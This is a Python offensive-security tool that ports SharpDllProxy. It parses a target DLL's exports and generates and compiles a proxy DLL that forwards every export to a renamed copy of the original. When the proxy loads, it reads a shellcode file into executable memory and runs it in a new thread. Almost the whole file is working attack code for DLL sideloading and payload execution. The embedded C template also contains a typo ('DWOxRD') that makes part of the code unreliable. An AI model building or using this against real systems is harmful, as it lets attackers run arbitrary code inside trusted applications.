#!/usr/bin/env python3
import argparse
import pefile
import logging
import sys
import os 
import tempfile
import shutil
import subprocess

template = """
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("SHELLCODE", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
    fread(buffer, size, 1, fp);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buffer, size);

    ((void(*) ())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWOxRD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
    """
     
def parse_args():
    parser = argparse.ArgumentParser(
        description="Python version of Flangvik's SharpDllProxy"
    )

    # Positional argument (required)
    parser.add_argument("-d", "--dllpath", help="Path to input DLL", required=True)
    parser.add_argument("-p", "--payload", help="Shellcode payload", required=True)
    parser.add_argument("-c", "--compile", help="Compile the DLL", action="store_true", required=False)

    return parser.parse_args()

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s"
    )

def get_exported_functions(dll_path):
    try:
        pe = pefile.PE(dll_path)
        exports = []
        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                exports.append((exp.name, exp.ordinal))
        else:
            logging.warning("[-] No exports found in the DLL.")
        return exports
    except Exception as e:
        logging.error(f"[-] Failed to parse DLL: {e}")
        sys.exit(1)

def main():
    args = parse_args()
    setup_logging()

    if not os.path.isfile(args.dllpath):
        logging.error("[-] DLL file does not exist.")
        sys.exit(1)

    if not os.path.isfile(args.payload):
        logging.error("[-] Shellcode file does not exist.")
        sys.exit(1)
    logging.info(f"[+] Reading exports from {args.dllpath}")
    exports = get_exported_functions(args.dllpath)
    logging.info(f"[+] Found {len(exports)} exported function(s):")

    pragmas = []
    orgDllName = os.path.splitext(os.path.basename(args.dllpath))[0]
    temp_name = os.path.basename(tempfile.NamedTemporaryFile(delete=True).name)

    dllname = f"{temp_name}_{orgDllName}.dll"
    source_filename = f"{temp_name}_pragma.c"

    for func in exports:
        name = func[0].decode('utf-8')
        ordinal = func[1]
        builder = f'#pragma comment(linker, "/export:{name}={temp_name}.{name},@{ordinal}")'
        pragmas.append(builder)

    tmp = template.replace("PRAGMA_COMMENTS", '\n'.join(pragmas))
    source_output = tmp.replace("SHELLCODE", os.path.basename(args.payload))

    shutil.copyfile(args.dllpath, dllname)
    logging.info(f"[+] Original DLL copied to {dllname}")
    with open(source_filename, 'w') as file:
        file.write(source_output)
    logging.info(f"[+] Exporting DLL C source to {source_filename}")

    if not args.compile:
        logging.info(f"[+] Success! Run 'x86_64-w64-mingw32-gcc {source_filename} -shared -o {orgDllName}.dll' to compile the DLL")
        sys.exit(0)
    elif args.compile:
        path = shutil.which("x86_64-w64-mingw32-gcc")
        if not path:
            logging.error("[-] Compiler not installed. Install mingw64-gcc and try again")
            sys.exit(1)
        try:
            result = subprocess.run(
                [path, source_filename, "-shared", "-o", f"{orgDllName}.dll"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
                text=True
            )
            logging.info(f"[+] Success - compiled {source_filename} to {orgDllName}.dll")
        except subprocess.CalledProcessError as e:
            logging.error("[-] ", e.stderr)
            sys.exit(1)

if __name__ == "__main__":
    main()